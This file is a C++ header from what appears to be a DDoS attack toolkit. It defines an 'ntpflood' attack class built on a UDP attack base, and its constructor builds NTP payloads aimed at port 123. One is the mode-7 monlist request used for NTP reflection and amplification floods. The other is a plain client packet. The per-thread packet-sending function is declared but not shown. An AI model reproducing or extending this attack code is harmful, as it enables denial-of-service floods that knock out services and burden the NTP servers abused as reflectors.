#ifndef _NTP_ATK_H
#define _NTP_ATK_H

#include "pktbuild.h"

#define NTP_PKT_MAX_LEN 600
#define NTPPORT 123
typedef struct NTPPACKET
{
  uint8_t li_vn_mode;
  uint8_t stratum;
  uint8_t poll;
  uint8_t precision;
  uint32_t root_delay;
  uint32_t root_dispersion;
  int8_t ref_id[4];
  uint64_t reftimestamp;
  uint64_t oritimestamp;
  uint64_t recvtimestamp;
  uint64_t trantimestamp;
}NTPPacket;

typedef struct NTPPACKET1
{
  uint8_t flag;
  uint8_t auth;
  uint8_t implement;
  uint8_t code;
  char pad[196];
}NTPMonListPacket;

class CNtpAtk : public CUdpAtk{
public:
	CNtpAtk() : CUdpAtk(){
		strncpy(m_name, "ntpflood", 31);
		m_params.m_iph_proto = IPPROTO_UDP;
	}
	CNtpAtk(const CDDoSParam& param) :CUdpAtk(param){
		strncpy(m_name, "ntpflood", 31);
	 	if (m_params.m_ntp_monlist && m_params.m_payload_data == NULL){
		    NTPMonListPacket ntppkt;
	        memset(&ntppkt, 0, sizeof(ntppkt)); 	   
			ntppkt.flag = 0x27;
			ntppkt.auth = 0;
			ntppkt.implement = 0x03;
			ntppkt.code = 0x2a;
			m_params.m_payload_len = sizeof(ntppkt);
			m_params.set_payload_data((char*)&ntppkt, sizeof(ntppkt));

	    }else if(m_params.m_ntp_monlist ==  false && m_params.m_payload_data == NULL){
			NTPPacket ntppkt;
			memset(&ntppkt, 0, sizeof(ntppkt)); 	
	        ntppkt.li_vn_mode = 0x1b;         //0|(3<<2)|(3<<5);
	        ntppkt.trantimestamp = time(NULL);
	        ntppkt.trantimestamp = htonll(ntppkt.trantimestamp);
	        m_params.m_payload_len = sizeof(ntppkt);	
			m_params.set_payload_data((char*)&ntppkt, sizeof(ntppkt));
		}
		/*
		if(m_params.m_type == ATK_VEC_NTP){
		    char payload1[DNS_PKT_MAX_LEN] = {0};
			if(m_params.m_payload_len>0 && m_params.m_payload_data==NULL){
				rand_str(payload1, m_params.m_payload_len);
				m_params.set_payload_data(payload1, m_params.m_payload_len);
			}
		}*/
		m_params.m_iph_proto = IPPROTO_UDP;
	}
	virtual ~CNtpAtk(){
	// TODO Auto-generated destructor stub
	}
    bool check_params();
	int32_t attack_one_pkt(int thrd_index);
};

#endif